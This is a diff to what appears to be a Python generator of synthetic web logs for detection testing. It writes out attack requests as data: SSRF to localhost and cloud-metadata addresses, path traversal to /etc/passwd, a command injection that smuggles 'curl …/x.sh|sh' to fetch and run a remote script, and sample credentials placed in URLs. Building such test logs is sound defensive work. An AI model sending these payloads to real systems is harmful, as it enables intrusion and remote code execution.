@@ -78,6 +78,11 @@ for q in ["url=http%3A%2F%2F127.0.0.1%3A7001%2Fconsole", "url=http%3A%2F%2F169.2
         web(t, A2, "app.example", "/api/proxy", q)
         t += 30
 web(t + 60, A2, "app.example", "/download", "file=..%2F..%2F..%2F..%2Fetc%2Fpasswd")
+# credentials in URLs: an SSRF carrying a user and password, and a login sent with GET by an ordinary user
+web(t + 120, A2, "files.example", "/fetch", "url=http%3A%2F%2Fsvc_backup%3AW1nter%2523Pass%40192.168.10.5%2Fadmin")
+for k in range(3):
+    web(T0 + 86400 + 9 * 3600 + k * 600, "10.20.30.40", "shop.example", "/account/login",
+        "username=jdoe&password=Summer2026%21&remember=1", 302)
 web(t + 300, A2, "app.example", "/ping", f"host=127.0.0.1%3Bcurl%20http%3A%2F%2F{CB}%2Fx.sh%7Csh")
 # the same actors elsewhere
 for k in range(30):
